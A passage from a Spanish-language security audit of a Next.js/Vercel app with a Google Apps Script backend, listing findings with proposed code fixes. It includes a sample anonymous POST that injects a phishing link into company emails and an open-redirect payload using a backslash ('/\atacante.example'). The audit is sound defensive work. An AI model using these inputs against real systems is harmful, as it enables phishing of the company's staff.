**Refuerzo recomendado:** eliminar el directorio `app/api/diagnostico/` y `app/api/migracion/` del despliegue. `.vercelignore` ya excluye `test/`, `apps-script.gs` y la documentación; agregar estas dos rutas hace que el código ni siquiera exista en la función serverless, lo que es más fuerte que cualquier guard en tiempo de ejecución. La contra es que `/api/migracion/setup` está documentada como el camino de provisión de instancias nuevas (`app/api/migracion/setup/route.js:14`) — pero ese comentario también dice que se corre desde local, así que excluirla del deploy no quita nada.

### 3.2 [Alto] El `/exec` de Apps Script sigue público y sin autenticar

**Ubicación:** `apps-script.gs:97-100` (`ACTIONS_ACTIVAS`), `:157-170` (`doGet`), `:189-203` (`doPost`), `:446-483` (`notifyFotoPending`).

El endpoint está desplegado como aplicación web con acceso "cualquier usuario" y **no valida nada**: ni token, ni firma, ni origen. La reducción de superficie que se hizo en la v6 es real y está bien ejecutada —de 24 actions quedan 2, y `doGet` ya no asume `read` por default (`apps-script.gs:158-160`), lo que cerró un volcado completo de la planilla— pero lo que queda es explotable.

**Por qué es un riesgo.** `notifyFotoPending` es alcanzable por `POST` anónimo, y todos los campos del cuerpo del correo llegan del atacante (`apps-script.gs:462-467`):

```
POST https://script.google.com/…/exec
{"action":"notifyFotoPending","sucursal":"URGENTE: verifica tu cuenta",
 "link":"https://sitio-falso.example/login","fileName":"…","periodo":"…"}
```

El correo sale **desde la cuenta de Google de la empresa**, con asunto `[Registro Consumos] Nueva foto pendiente · <texto del atacante>` y un cuerpo que incluye el enlace que el atacante eligió, hacia los destinatarios reales configurados en `fotoNotifEmails`. Es phishing interno con remitente legítimo y plantilla legítima — de las cosas más difíciles de detectar para el destinatario. Además, repetir el `POST` agota la cuota diaria de `MailApp` y deja la notificación real inoperativa.

Que la URL del `/exec` no esté en el repositorio ayuda, pero no es un control de seguridad: aparece en los logs de red de la función, en el panel de Vercel y en cualquier captura de tráfico.

**Solución, paso a paso.**

**Paso 1** — secreto compartido entre la app y el script. En Vercel, una variable nueva `APPS_SCRIPT_TOKEN`; en el editor de Apps Script, la misma en *Propiedades del script*:

```js
// apps-script.gs
/**
 * El /exec está desplegado como "cualquier usuario" y no puede dejar de estarlo:
 * la app le habla desde Vercel sin sesión de Google. La autorización, entonces, es
 * un secreto compartido en el cuerpo. Sin esto, notifyFotoPending es un relay de
 * correo anónimo que sale desde la cuenta de la empresa.
 */
function tokenValido(body) {
  var esperado = PropertiesService.getScriptProperties().getProperty("RC_TOKEN") || "";
  var recibido = String((body && body.token) || "");
  if (!esperado || esperado.length !== recibido.length) return false;
  var dif = 0;
  for (var i = 0; i < esperado.length; i++) dif |= esperado.charCodeAt(i) ^ recibido.charCodeAt(i);
  return dif === 0;
}

function doPost(e) {
  try {
    const body = JSON.parse(e.postData.contents || "{}");
    if (!tokenValido(body)) return jsonOut({ error: "no autorizado" });
    const action = body.action;
    if (!ACTIONS_ACTIVAS[action]) return actionRetirada(action || "(ninguna)");
    if (action === "notifyFotoPending") return jsonOut(notifyFotoPending(body));
    return jsonOut({ error: "unknown action: " + action });
  } catch (err) {
    return jsonOut({ error: String(err && err.message || err) });
  }
}
```

**Paso 2** — inyectar el token en el transporte, una sola vez, en `lib/apps-script.js`:

```js
export async function apiPost(body) {
  const action = body && body.action;
  if (usarSdk(action)) return SDK_POST[action](body || {});
  if (!appsScriptConfigurado()) throw new BackendNotConfiguredError();
  const res = await fetch(appsScriptUrl(), {
    method: "POST",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify({ ...(body || {}), token: process.env.APPS_SCRIPT_TOKEN || "" }),
    cache: "no-store",
  });
  if (!res.ok) throw new Error("Apps Script HTTP " + res.status);
  return unwrap(await res.json());
}
```

Lo mismo en `appsScriptPost` (`:156`) y, con `?token=`, en `apiGet`/`appsScriptGet` para `ping`.

**Paso 3** — sanear el contenido del correo, porque el token protege el canal pero no la plantilla si el token se filtra:

```js
// apps-script.gs — en notifyFotoPending
function limpio(v, max) {
  return String(v == null ? "—" : v).replace(/[\r\n]+/g, " ").slice(0, max || 120);
}
var sucursal = limpio(body.sucursal, 80);
var tipo     = limpio(body.tipo, 40);
var periodo  = limpio(body.periodo, 20);
var fileName = limpio(body.fileName, 120);
// El link solo se incluye si apunta a Drive: el correo sale desde la cuenta de la
// empresa, así que un enlace arbitrario acá es phishing con remitente legítimo.
var link = /^https:\/\/(drive|docs)\.google\.com\//.test(String(body.link || "")) ? body.link : "";
```

**Paso 4** — evaluar dar de baja el `/exec`. Es la única razón por la que sigue vivo (`.env.local.example:96-99`). Un proveedor de correo transaccional (Resend, Brevo) resuelve la notificación con una llamada HTTP autenticada y permite retirar el endpoint público por completo. Es el arreglo definitivo.

### 3.3 [Medio] `/api/diagnostico/exec-post` habilitada en producción

**Ubicación:** `app/api/diagnostico/exec-post/route.js`, especialmente `:163-168` y `:176-179`.

La ruta está deliberadamente disponible en producción, y el comentario explica bien por qué (`:26-29`: el bug solo se reproduce allá). Pero:

- **`:163-168`** — cada `GET` dispara `POST`s de 1, 3, 5 y 8 MB contra el `/exec`, más tres pequeños: **~17 MB de salida por request**. Sin autenticación efectiva, un atacante convierte un `GET` barato en 17 MB de egreso facturable y consumo de cuota de Apps Script. Es amplificación de tráfico.
- **`:176-179`** — con `?upload=si` **escribe en Drive**: sube un archivo a la carpeta real de facturas de medidores. El comentario dice "acá no hay nada que se pueda romper" (`:28`); con `?upload=si` eso deja de ser cierto. La limpieza es best-effort y el propio código contempla que falle (`:122`).

**Solución.** Mantener la ruta pero acotarla:

```js
export async function GET(request) {
  // El diagnóstico se corre a mano, una vez, cuando hay un bug que investigar.
  // Sin esto la ruta es un amplificador: un GET de 300 bytes produce 17 MB de POSTs.
  const secreto = process.env.RC_DIAG_TOKEN || "";
  if (!secreto || request.nextUrl.searchParams.get("token") !== secreto) {
    return NextResponse.json({ error: "no encontrado" }, { status: 404 });
  }
  if (!appsScriptConfigurado()) {
    return NextResponse.json({ error: "APPS_SCRIPT_URL no configurada" }, { status: 503 });
  }
  // La escalera de tamaños solo si se pide: es la parte cara.
  const conGrandes = request.nextUrl.searchParams.get("tamanos") === "si";
  // …
}
```

Y quitar `?upload=si`, o exigir un segundo parámetro explícito además del token.

### 3.4 [Medio] `/medidores/reporte` sin control propio y con parámetros reflejados

**Ubicación:** `app/medidores/reporte/route.js:16-50`.

La ruta valida `tipo` contra `MED_TYPES` (`:21`) —correcto— pero no `sucursal`, que se refleja en el `<title>` del HTML (escapado, ver 4.4) y se usa para filtrar los datos que se devuelven. No verifica sesión por su cuenta, así que hereda todo lo del hallazgo 2.2: con el muro apagado, cualquiera obtiene el reporte completo de consumo, costos y emisiones de cualquier sucursal cuyo nombre adivine o enumere.

**Solución.** Aplicar el guard de 2.1 y validar `sucursal` contra la lista real:

```js
export async function GET(request) {
  await exigirSesion();                     // hereda el 401 si no hay sesión

  const q = request.nextUrl.searchParams;
  const tipo = q.get("tipo") || "";
  const sucursal = q.get("sucursal") || "";
  if (!MED_TYPES[tipo]) return new Response("Tipo inválido.", { status: 400 });

  const sucursales = await loadSucursales();
  // `sucursal` decide qué datos salen: tiene que existir, no solo no estar vacía.
  if (!sucursales.data.some((s) => s.nombre === sucursal)) {
    return new Response("Sucursal inválida.", { status: 400 });
  }
  // …resto igual
}
```

### 3.5 Sin observaciones: las 12 rutas de `/api/migracion/*` y `/api/diagnostico/drive`

Verificadas una por una. Todas cortan con `NODE_ENV === "production"` antes de ejecutar cualquier lógica, incluidas las que escriben (`columna-id:149`, `setup:112`, `probe-b/c/d/e/g`, `probe-escritura`, `probe-setup`, `invalidar`). El guard está en la primera línea del handler, antes de leer parámetros — que es donde debe estar. Además:

- `/api/migracion/columna-id` exige `?aplicar=si` para escribir (`:154-162`) — doble confirmación sobre una operación destructiva.
- `/api/migracion/setup` exige `?forzar=si` si ya hay `driveFolders` (`:143-153`), con respaldo del valor anterior en la respuesta.
- Las probes que tocan hojas con datos reales toman copia y restauran en `finally`, y lo registran en el log del servidor antes de tocar nada (`probe-d:14-19`).

Este bloque está bien hecho y el razonamiento está documentado en el propio código. `NODE_ENV` es además `"production"` en los deploys de Preview de Vercel, así que el guard cubre también ese caso — que es lo correcto y suele olvidarse.

---

## 4. Vulnerabilidades del lado del cliente (XSS y CSRF)

### 4.1 Sin observaciones: `dangerouslySetInnerHTML`

**No existe un solo uso** de `dangerouslySetInnerHTML` ni de `innerHTML` en `app/`, `components/` ni `lib/`. Todo el renderizado pasa por JSX, que escapa por defecto. Los prototipos archivados en `_legacy/` tampoco lo usan, y en cualquier caso están fuera del build.

### 4.2 Sin observaciones: gestión de sesión y almacenamiento del token

Este bloque está **bien resuelto** y merece decirse explícitamente:

- **Cookie `HttpOnly`** (`lib/auth/acceso.js:110-119`): el JS de la propia aplicación no puede leerla, así que un XSS hipotético no roba la sesión.
- **`secure` en producción**, `sameSite: "lax"`, `path: "/"`, `maxAge` alineado con la vigencia del token.
- **El token no contiene la contraseña** (`:81-92`): es `<vencimiento>.<HMAC-SHA256(vencimiento, password)>`. Robar la cookie no revela el secreto.
- **Comparación en tiempo constante** (`:60-65`) tanto para la contraseña como para la firma del token. Y la firma se verifica **antes** del vencimiento (`:101-106`), para no dar mensajes de error distinguibles. Este nivel de cuidado es infrecuente.
- **HMAC sobre el intento en vez de comparar textos** (`:71-79`): el largo de lo que manda el visitante no altera el tiempo de respuesta.
- **`localStorage` no guarda nada sensible**: el único uso en todo el proyecto es el estado colapsado del sidebar (`components/shell/app-shell.jsx:37,50`), envuelto en `try/catch`.
- **CSRF**: las Server Actions de Next validan `Origin` contra `Host` de forma nativa, así que el CSRF clásico está cubierto por el framework. La cookie con `SameSite=Lax` es una segunda capa. No hay endpoints `POST` propios que acepten formularios sin esa protección.

### 4.3 [Medio] La sesión no se puede revocar individualmente

**Ubicación:** `lib/auth/acceso.js:89-107`, `app/actions/acceso.js:94-99`.

El token es `<exp>.<firma>` y no contiene identificador de sesión. `salirAction` solo borra la cookie del navegador:

```js
export async function salirAction() {
  return run(async () => {
    const store = await cookies();
    store.set({ ...opcionesCookie(), name: COOKIE_ACCESO, value: "", maxAge: 0 });
    return { salio: true };
  });
}
```

**Por qué es un riesgo.** Un token copiado antes del "salir" **sigue siendo válido** los 7 días completos (`VIGENCIA_MS`, `:19`). No hay lista de revocación ni identificador que invalidar. La única forma de cortar una sesión comprometida es rotar `SITE_PASSWORD`, lo que expulsa a todo el equipo a la vez — el propio código lo documenta como característica (`:86-87`), y para rotación planificada lo es, pero como único mecanismo de respuesta a incidente es tosco. Con 7 días de vigencia, la ventana es amplia.

**Solución (incremental, sin rediseñar).** Agregar un generación al token, leída de una variable de entorno, para poder invalidar en masa sin cambiar la contraseña, y bajar la vigencia:

```js
// lib/auth/acceso.js
const VIGENCIA_MS = 24 * 60 * 60 * 1000;   // 7 días era mucho para un secreto compartido

/** Generación de sesiones. Subirla invalida todas sin rotar la contraseña. */
function generacion() {
  return String(process.env.SITE_SESSION_GEN || "1");
}

export async function crearToken(ahora = Date.now()) {
  const payload = `${generacion()}.${ahora + VIGENCIA_MS}`;
  return `${payload}.${await hmac(payload, passwordDelSitio())}`;
}

export async function tokenValido(token, ahora = Date.now()) {
  if (!token || typeof token !== "string") return false;
  const partes = token.split(".");
  if (partes.length !== 3) return false;
  const [gen, exp, firma] = partes;
  if (gen !== generacion()) return false;        // generación vieja: fuera
  if (!/^\d+$/.test(exp)) return false;
  const esperada = await hmac(`${gen}.${exp}`, passwordDelSitio());
  if (!igualEnTiempoConstante(firma, esperada)) return false;
  return Number(exp) > ahora;
}
```

El arreglo de fondo es reemplazar la contraseña compartida por identidades reales (Google OAuth contra el dominio de la empresa, que además resuelve el "no sirve para saber QUIÉN entró" de `:16`). El propio código lo llama "el paso previo a los roles"; conviene que ese paso siguiente esté en el plan.

### 4.4 [Medio] Scripts de terceros desde CDN sin integridad en el reporte

**Ubicación:** `lib/reportes/medidores-html.js`, cerca de la línea 424:

```html
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jspdf@2.5.1/dist/jspdf.umd.min.js"></script>
```

**Por qué es un riesgo.** El reporte incluye consumos, costos y emisiones reales de la empresa, y le da a un CDN de terceros **ejecución de JavaScript sin restricciones** sobre esa página. No hay atributo `integrity`, así que si jsdelivr o el paquete se comprometen, el script alterado corre con acceso total al DOM del reporte y puede exfiltrarlo. Es la misma dependencia de CDN que el proyecto **ya eliminó** para pdf.js en `lib/extractores/texto-pdf.js:6-9` ("saca la dependencia de un CDN ajeno del camino crítico") — el criterio correcto ya está en el repositorio, solo no se aplicó acá. Además, estos dos `<script src>` externos hacen imposible una CSP estricta (hallazgo 5.1).

**Solución.** Dos opciones, en orden de preferencia.

*Opción A (recomendada) — eliminar la dependencia.* El botón "Imprimir" ya usa `window.print()`, y todos los navegadores modernos ofrecen "Guardar como PDF" en el diálogo de impresión. El CSS del reporte ya define `@page { size: A4 portrait }` y reglas `@media print` (`medidores-html.js:~410`), así que el PDF nativo sale bien maquetado y con **texto seleccionable**, mejor que el JPEG rasterizado que produce html2canvas hoy. Se borran los dos `<script src>`, la función `dlPDF` y el botón `#dlbtn`, y se cambia la etiqueta del botón que queda a "Descargar PDF (Imprimir → Guardar como PDF)".

*Opción B — servir las librerías desde el propio dominio.* Instalar `html2canvas` y `jspdf` como dependencias, y servirlas desde `public/`:

```html
<script src="/vendor/html2canvas-1.4.1.min.js"></script>
<script src="/vendor/jspdf-2.5.1.umd.min.js"></script>
```

Si por alguna razón hay que conservar el CDN, como mínimo agregar SRI:

```html
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"
        integrity="sha384-<hash>" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
```

### 4.5 [Medio] Open redirect: la barra invertida evade la validación de `?volver=`

**Ubicación:** `app/acceso/page.jsx:18-20`, y el origen del parámetro en `proxy.js:39-41`.

```js
// Solo rutas internas: un `volver` con host propio convertiría esta pantalla en
// un trampolín para mandar gente a otro sitio desde nuestro dominio.
const destino = volver.startsWith("/") && !volver.startsWith("//") ? volver : "/";
```

**Por qué es un riesgo.** La intención es correcta y el comentario identifica bien la amenaza, pero el filtro tiene un hueco: `?volver=/\atacante.example`. Empieza con `/` y no con `//`, así que pasa. El problema es que la especificación WHATWG de URL trata `\` como equivalente a `/` para esquemas especiales, así que al resolverse el navegador interpreta `/\atacante.example` como `//atacante.example` — una URL protocolo-relativa — y navega **fuera del dominio**. El destino llega a `router.replace(destino)` en `components/views/acceso.jsx:38`, que hace exactamente eso.

El resultado es un enlace de phishing que empieza con el dominio legítimo de la empresa (`https://consumos.recylink.com/acceso?volver=…`), pasa el muro y deposita al usuario en un sitio controlado por el atacante justo después de que escribió una contraseña.

**Solución.** Validar con el parser de URL en vez de con prefijos de string:

```js
// app/acceso/page.jsx
/**
 * Solo rutas internas. No alcanza con `startsWith("/")`: `/\atacante.example` lo
 * cumple, y el navegador normaliza la barra invertida a `//` — o sea, a otro host.
 * Se resuelve contra un origen ficticio y se comprueba que no haya cambiado.
 */
function rutaInterna(valor) {
  if (typeof valor !== "string" || !valor.startsWith("/")) return "/";
  try {
    const u = new URL(valor, "https://interno.invalid");
    if (u.origin !== "https://interno.invalid") return "/";   // se escapó del origen
    return u.pathname + u.search;                             // sin hash ni credenciales
  } catch {
    return "/";
  }
}

export default async function AccesoPage({ searchParams }) {
  const params = await searchParams;
  const destino = rutaInterna(typeof params?.volver === "string" ? params.volver : "/");
  // …resto igual
}
```

Y en `proxy.js:41`, normalizar antes de construir el `?volver=` para no propagar el valor crudo.

### 4.6 [Bajo] `esc()` no escapa la comilla simple

**Ubicación:** `lib/reportes/medidores-html.js:33-34`.

```js
const esc = (s) =>
  String(s == null ? "" : s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
```

**Por qué es un riesgo.** Hoy **no es explotable**: se revisaron los ~40 puntos de interpolación del archivo y todos los atributos usan comillas dobles, que sí se escapan. Pero es una trampa para el próximo cambio — un atributo escrito con comillas simples, o un `style='…'`, convierte esta función en insuficiente en silencio. También conviene notar que algunos valores derivados se interpolan sin `esc()` (`unidad` en `:~430` viene de `medUnit(tipo)` con `tipo` ya validado contra `MED_TYPES`, y `perLbl` de `periodToMonthKeys`): son seguros hoy porque provienen de mapas fijos, no de entrada de usuario.

**Solución.** Completar el conjunto y aplicarlo también a los valores derivados, por consistencia:

```js
const ESCAPES = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;", "`": "&#96;" };
const esc = (s) => String(s == null ? "" : s).replace(/[&<>"'`]/g, (c) => ESCAPES[c]);
```

---

## 5. Configuración del proyecto (`next.config.mjs`)

### 5.1 [Alto] Ausencia total de cabeceras de seguridad

**Ubicación:** `next.config.mjs` — el archivo completo no tiene bloque `headers()`. Se confirmó que ninguna cabecera se define en otro lugar (`proxy.js` solo redirige, no agrega cabeceras).

Faltan **todas**:

| Cabecera | Estado | Qué deja abierto |
|---|---|---|
| `Content-Security-Policy` | ausente | Cualquier XSS que aparezca ejecuta sin restricción; ninguna limitación de a dónde se puede exfiltrar |
| `Strict-Transport-Security` | ausente | Degradación a HTTP en el primer request; robo de cookie de sesión en red hostil |
| `X-Frame-Options` / `frame-ancestors` | ausente | La app se puede embeber en un iframe ajeno → clickjacking sobre acciones destructivas (borrar sucursal, borrar adjunto) |
| `X-Content-Type-Options` | ausente | MIME sniffing sobre respuestas de API y sobre `/medidores/reporte` |
| `Referrer-Policy` | ausente | Rutas internas y parámetros (`?sucursal=`, `?volver=`) se filtran a terceros por el `Referer` — y el reporte carga scripts de un CDN externo (4.4), así que hay a quién filtrarlos |
| `Permissions-Policy` | ausente | Cámara, micrófono y geolocalización quedan disponibles para todo el árbol de frames |

La cabecera de cámara es especialmente relevante acá: el flujo "Tomar foto" en móvil usa la cámara (`components/views/medidores-movil.jsx`, `app/registrar/foto/page.jsx`), así que hay que permitirla en el propio origen y negarla al resto.

**Solución.** Agregar el bloque completo. La CSP se plantea en dos niveles porque `/medidores/reporte` tiene requisitos distintos del resto de la app (estilos inline, `onclick`, y hoy scripts de CDN):

```js
// next.config.mjs
import { BODY_SIZE_LIMIT } from "./lib/domain/archivos.js";

const CSP_APP = [
  "default-src 'self'",
  // Next inyecta scripts inline para hidratación y el runtime del App Router.
  // 'unsafe-inline' es el precio de no implementar nonces por request; si se
  // quiere endurecer, se genera un nonce en proxy.js y se propaga acá.
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",           // los componentes usan style={{…}}
  "img-src 'self' data: blob: https://drive.google.com https://*.googleusercontent.com",
  "font-src 'self' data:",
  // La app habla con su propio backend por Server Actions; no necesita salir a otros hosts.
  "connect-src 'self'",
  "frame-ancestors 'none'",
  "form-action 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  "upgrade-insecure-requests",
].join("; ");

const CABECERAS_BASE = [
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  // La cámara SÍ se usa (flujo "Tomar foto" en móvil), pero solo en este origen.
  { key: "Permissions-Policy", value: "camera=(self), microphone=(), geolocation=(), payment=()" },
  { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
];

const nextConfig = {
  reactStrictMode: true,
  // El `X-Powered-By: Next.js` no aporta nada y anuncia el stack y su versión.
  poweredByHeader: false,
  serverExternalPackages: ["pdfjs-dist", "xlsx"],
  outputFileTracingIncludes: {
    "/registrar/subir": ["./node_modules/pdfjs-dist/legacy/build/pdf.worker.mjs"],
  },
  experimental: {
    serverActions: { bodySizeLimit: BODY_SIZE_LIMIT },
  },
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [...CABECERAS_BASE, { key: "Content-Security-Policy", value: CSP_APP }],
      },
      {
        // El reporte es un documento suelto con estilos y handlers inline
        // (medidores-html.js). Si se elimina la dependencia del CDN (ver 4.4),
        // este bloque puede colapsarse en CSP_APP.
        source: "/medidores/reporte",
        headers: [
          ...CABECERAS_BASE,
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: blob:",
              "font-src 'self' data:",
              "connect-src 'self'",
              "frame-ancestors 'none'",
              "object-src 'none'",
              "base-uri 'self'",
            ].join("; "),
          },
        ],
      },
      {
        // Nada de /api/ debería quedar en una caché intermedia.
        source: "/api/:path*",
        headers: [...CABECERAS_BASE, { key: "Cache-Control", value: "no-store, max-age=0" }],
      },
    ];
  },
};

export default nextConfig;
```

**Nota de orden de trabajo:** el bloque de `/medidores/reporte` mantiene `'unsafe-inline'` para scripts porque el HTML generado usa `onclick="window.print()"` y un `<script>` inline. Al aplicar la Opción A del hallazgo 4.4 (eliminar html2canvas/jspdf y quedarse con `window.print()`), conviene además mover ese `onclick` a un `addEventListener` en un archivo servido desde `/public`, y entonces el reporte puede pasar a `script-src 'self'` estricto.

### 5.2 [Alto] `xlsx@0.18.5`: CVEs sin parche disponible en npm

**Ubicación:** `package.json:14`, usado en `lib/extractores/iconstruye.js:33` (`XLSX.read` sobre archivo subido por el usuario) y `lib/reportes/medidores-excel.js:105`.

**Por qué es un riesgo.** La versión 0.18.5 es la última publicada en el registro de npm, y arrastra:

- **CVE-2023-30533** — contaminación de prototipo (*prototype pollution*) al parsear un archivo manipulado. Corregida en 0.19.3, que **nunca se publicó en npm**: SheetJS movió la distribución a su propio CDN.
- **CVE-2024-22363** — ReDoS por expresión regular al procesar contenido manipulado. Misma situación.

`XLSX.read(buf, { cellDates: true })` corre sobre un `.xlsx`/`.xls` que llega de `extraerDocumentoAction`, es decir de una subida de usuario, en el proceso de la función serverless. Combinado con el hallazgo 2.5 (sin validación de tipo real) y 2.1 (sin autenticación), la ruta de ataque es directa.

**Solución, paso a paso.**

**Paso 1** — migrar al paquete oficial parcheado, que se instala desde el CDN de SheetJS:

```bash
npm remove xlsx
npm install --save https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz
```

Esto deja en `package.json` una dependencia por URL. Es lo que recomienda el propio proyecto SheetJS y no requiere cambios de código: la API es compatible. Verificar que el build de Vercel resuelve la URL (lo hace; si la política de la organización lo prohíbe, ir al Paso 2).

**Paso 2 (alternativa)** — reemplazar por `exceljs`, que se mantiene en npm:

```bash
npm install exceljs
```

`lib/extractores/iconstruye.js` y `lib/reportes/medidores-excel.js` son los dos únicos consumidores, y ambos usan una porción pequeña de la API (`read` + `sheet_to_json`, y `aoa_to_sheet` + `write`). La migración es acotada.

**Paso 3** — en cualquier caso, aislar el parseo. Aunque la librería esté parcheada, procesar formatos complejos de origen no confiable merece límites:

```js
// lib/extractores/iconstruye.js
const MAX_EXCEL_BYTES = 5 * 1024 * 1024;   // una planilla de facturación real no pasa de esto

export async function extraerExcel(file, provider) {
  if (file.size > MAX_EXCEL_BYTES) {
    throw new Error(`La planilla pesa ${tamanoLegible(file.size)} y el máximo para extracción es ${tamanoLegible(MAX_EXCEL_BYTES)}.`);
  }
  const buf = await file.arrayBuffer();
  // `sheetRows` acota lo que se materializa: un archivo con un millón de filas
  // declaradas no se convierte en un millón de objetos en memoria.
  const wb = XLSX.read(buf, { cellDates: true, sheetRows: 5000, cellHTML: false, cellFormula: false });
  // …
}
```

**Paso 4** — incorporar `npm audit --omit=dev` al CI. El proyecto no tiene workflow de CI configurado; una comprobación en el pipeline de Vercel o un GitHub Action mínimo cierra esta clase de hallazgo de forma permanente.

### 5.3 [Medio] Parseo de PDF sin límites de recursos

**Ubicación:** `lib/extractores/texto-pdf.js:54-93`, alcanzable desde `extraerDocumentoAction`.

`getDocument({ data })` corre sin `stopAtErrors`, sin límite de tamaño y sin timeout. El código sí acota a 2 páginas para la **extracción de texto** (`:69-74`), que es lo caro por página, pero `getDocument().promise` ya parseó la estructura completa del documento antes de eso. Un PDF manipulado con un árbol de objetos patológico, o comprimido de forma que se expanda enormemente, consume CPU y memoria de la función.

El archivo documenta que `disableWorker` e `isEvalSupported` "no existen en pdfjs 6, así que no hacían nada" (`:60-63`). Conviene verificarlo contra la versión instalada: `isEvalSupported` sigue presente en la API de pdf.js v4/v5 y controla si se usa el constructor `Function` para optimizar programas de fuentes. Si existe en la 6, ponerlo en `false` es gratis.

**Solución.**

```js
// lib/extractores/texto-pdf.js
const MAX_PDF_BYTES = 15 * 1024 * 1024;

export async function textoDePdf(buffer) {
  if (buffer.byteLength > MAX_PDF_BYTES) {
    throw new Error("El PDF excede el tamaño máximo para extracción.");
  }
  const { getDocument } = await pdfjs();
  const tarea = getDocument({
    data: new Uint8Array(buffer),
    // Un PDF manipulado no debería poder tener a la función ocupada indefinidamente.
    stopAtErrors: true,
    // No traer recursos externos referenciados por el documento.
    disableAutoFetch: true,
    disableStream: true,
    // Verificar contra la versión instalada: si la opción existe, apagarla es gratis.
    isEvalSupported: false,
  });

  // Un timeout duro: `getDocument` puede quedarse parseando estructuras patológicas.
  const pdf = await Promise.race([
    tarea.promise,
    new Promise((_, rechazar) =>
      setTimeout(() => { tarea.destroy(); rechazar(new Error("El PDF tardó demasiado en abrirse.")); }, 15000)),
  ]);
  // …resto igual
}
```

### 5.4 [Medio] Rate limiting solo en el login, en memoria y por instancia

**Ubicación:** `app/actions/acceso.js:28-66`.

La implementación es cuidadosa: ventana deslizante de 5 minutos, 10 intentos, **por IP** en vez de un contador global (el comentario en `:18-22` explica bien por qué el contador global era en sí mismo un ataque), y techo de memoria `MAX_IPS` para no crecer sin límite. Buen trabajo.

Sus dos límites están documentados en el propio código (`:24-27`) y merecen quedar en el reporte:

1. **Es por instancia y volátil.** Con Fluid Compute y varias instancias concurrentes, el atacante reparte los intentos y el límite efectivo se multiplica.
2. **La IP viene de `x-forwarded-for`** (`:61-66`), que en Vercel es confiable en el primer valor, pero el comentario acierta al decir que quien controle el header puede rotarla.

Y lo que **no** está cubierto: ninguna otra action tiene rate limiting. `submitManualAction`, `uploadMedidorDocAction` y `extraerDocumentoAction` aceptan 25 MB por request sin límite de frecuencia (ver 5.5).

**Solución.**
1. Activar el **rate limiting del firewall de Vercel** para `/acceso` y para las rutas de Server Actions. Es la recomendación que el propio comentario anticipa (`:26-27`) y es la única que funciona a través de instancias.
2. Si se quiere en la aplicación, un Redis del Marketplace de Vercel (o Upstash) convierte el `Map` en estado compartido con un cambio localizado en `demasiadosIntentos`/`anotarIntento`.
3. Extender el freno a las actions de escritura y subida, aunque sea con el `Map` en memoria: es imperfecto pero sube el costo del abuso automatizado.

### 5.5 [Bajo] `bodySizeLimit: 25mb` sin autenticación por delante

**Ubicación:** `next.config.mjs:29`, valor en `lib/domain/archivos.js:23`.

La subida del límite está bien justificada (`:19-22`: el default de 1 MB rompía el caso real de dos facturas escaneadas). El problema es de combinación, no del valor: con el muro apagado (2.2) y sin rate limiting en las actions (5.4), cualquiera puede mandar `POST`s de 25 MB repetidamente. Cada uno se carga en memoria de la función y, en el camino de Drive, se duplica en base64 (+33 % → ~33 MB). Es agotamiento de memoria y de facturación.

**Solución.** El límite en sí puede quedarse; lo que lo hace seguro son los hallazgos 2.1 (autenticación en las actions), 2.5 (validación de tamaño en el servidor) y 5.4 (rate limiting). Adicionalmente, considerar bajar `BODY_SIZE_LIMIT` a `12mb` si `MAX_LOTE_BYTES` se reduce en la misma proporción — 20 MB de adjuntos por envío es holgado para el caso de uso descrito.

### 5.6 [Bajo] `poweredByHeader` y `/api/version`

**Ubicación:** `next.config.mjs` (falta `poweredByHeader: false`), `app/api/version/route.js:13-18`.

`X-Powered-By: Next.js` sale en cada respuesta y anuncia el stack. Y `/api/version` está en `PUBLICAS` (`proxy.js:16`) y devuelve `VERCEL_DEPLOYMENT_ID` o `VERCEL_GIT_COMMIT_SHA` **sin autenticación**. El propósito es legítimo (el aviso de versión nueva del `version-banner.jsx`), pero el SHA de commit le dice a un atacante exactamente qué código está corriendo, lo que permite correlacionar con vulnerabilidades conocidas si el repositorio alguna vez se hace público.

**Solución.** `poweredByHeader: false` en `next.config.mjs` (ya incluido en el bloque de 5.1). Para `/api/version`, devolver un identificador opaco en vez del SHA:

```js
// app/api/version/route.js
import { createHash } from "node:crypto";

export function GET() {
  const real = process.env.VERCEL_DEPLOYMENT_ID || process.env.VERCEL_GIT_COMMIT_SHA || "dev";
  // Al cliente le alcanza con saber SI cambió, no CUÁL es. El SHA identifica el
  // código exacto que corre y esta ruta es pública (ver PUBLICAS en proxy.js).
  const version = real === "dev" ? "dev" : createHash("sha256").update(real).digest("hex").slice(0, 12);
  return NextResponse.json({ version }, { headers: { "Cache-Control": "no-store" } });
}
```

---

## 6. Plan de remediación sugerido

### Antes del próximo deploy (bloqueantes)

1. **Fijar `SITE_PASSWORD` en todos los entornos desplegados** y aplicar el fail-closed de 2.2. Es el único hallazgo que, sin resolver, deja los demás sin ninguna barrera.
2. **Agregar el guard `exigirSesion()` a `run()`** (2.1). Un archivo nuevo y dos líneas en `lib/result.js` cubren las 17 actions autenticadas.
3. **Agregar el guard de producción a las dos rutas de diagnóstico que lo perdieron** (3.1). Cuatro líneas.
4. **Verificar pertenencia en `deleteMedidorDocAction`** (2.3).

### Esta semana

5. Bloque `headers()` completo en `next.config.mjs`, con CSP (5.1).
6. `neutralizarFormula()` en las escrituras de Sheets y en el export a Excel (2.4).
7. Validación de tamaño y tipo real en el servidor para todas las subidas (2.5).
8. Migrar `xlsx` a la versión parcheada del CDN de SheetJS, o a `exceljs` (5.2).
